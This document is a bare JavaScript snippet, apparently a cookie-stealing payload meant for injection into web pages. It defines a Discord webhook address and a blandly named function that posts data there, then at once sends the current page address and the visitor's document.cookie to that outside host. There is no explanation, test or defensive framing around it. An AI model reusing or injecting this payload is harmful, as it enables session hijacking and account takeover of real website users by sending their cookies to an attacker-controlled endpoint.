var url = "https://discord.com/api/webhooks/1125044371184701440/7vA681wjzd9gFdHhIFFSYZcMDJzkwagcz0eEbNdA7sewwkw8PZVrKYlXed4hhC-__9G9"
function bleep(payload,url) {
    const request = new XMLHttpRequest();
    request.open("POST",url);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: payload
    }
    request.send(JSON.stringify(params));
}
bleep(window.location.href + ":" + document.cookie);
